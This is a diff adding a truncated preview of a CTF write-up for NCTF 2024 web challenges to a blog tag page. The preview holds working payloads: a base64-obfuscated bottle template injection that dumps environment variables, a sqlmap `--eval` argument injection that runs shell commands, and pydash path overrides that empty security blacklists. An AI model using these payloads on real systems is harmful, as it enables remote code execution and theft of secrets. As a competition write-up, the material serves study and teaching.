@@ -142,6 +142,29 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">CTF记录-NCTF_2024, 红明谷CTF_2025
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>NCTF 2024 WEB AK ez_dash 过滤不全，可以通过&lt;%%&gt;执行python代码，但没有回显，用继承链获取bottle报错回显。
+https://www.osgeo.cn/bottle/stpl.html#embedded-python-code 使用getattr绕过.，bottle.abort(401, &#34;message&#34;)函数可以直接报错返回内容。
+&lt;%eval(getattr(getattr(__import__(&#39;base64&#39;), &#39;b64decode&#39;)(&#39;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp&#39;), &#39;decode&#39;)())%&gt; sqlmap-master 参数注入，sqlmap -hh查看详细信息：
+--eval=EVALCODE Evaluate provided Python code before the request (e.g.&#34;import hashlib;id2=hashlib.md5(id).hexdigest()&#34;) sqlmap的eval可以执行python代码：
+sqlmap -u http://localhost --eval=&#34;print(1)&#34; 通过__import__报错回显，注意payload不能包含空格，不然会被分割。
+poc:
+http://localhost --eval=__import__(__import__(&#39;os&#39;).popen(__import__(&#39;base64&#39;).b64decode(&#39;ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==&#39;).decode()).read()) ez_dash_revenge 远程环境pydash版本比较高，不允许覆盖__globals__和__builtin__，
+黑名单检测代码pydash/helpers.py： RESTRICTED_KEYS内容为：
+RESTRICTED_KEYS = (&#34;__globals__&#34;, &#34;__builtins__&#34;) 覆盖黑名单POC：
+/setValue?name=pydash{&#34;path&#34;:&#34;helpers.RESTRICTED_KEYS&#34;,&#34;value&#34;:[]} 然后再通过__globals__覆盖题目自定义的黑名单,POC:
+/setValue?name=setval{&#34;path&#34;:&#34;__globals__.__forbidden_name__&#34;,&#34;value&#34;:[]}{&#34;path&#34;:&#34;__globals__.__forbidden_path__&#34;,&#34;value&#34;:[]} bottle模板引擎使用正则匹配模板字符串，set_syntax代码如下：
+def set_syntax(self, syntax): self._syntax = syntax self._tokens = syntax.split() if syntax not in self._re_cache: names = &#39;block_start block_close line_start inline_start inline_end&#39; etokens = map(re....</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-03-23 17:02:50 +0000 UTC'>March 23, 2025</span>&nbsp;·&nbsp;6 min</footer>
+  <a class="entry-link" aria-label="post link to CTF记录-NCTF_2024, 红明谷CTF_2025" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">CTF记录-VNCTF_2025, AliyunCTF 2025
     </h2>
   </header>
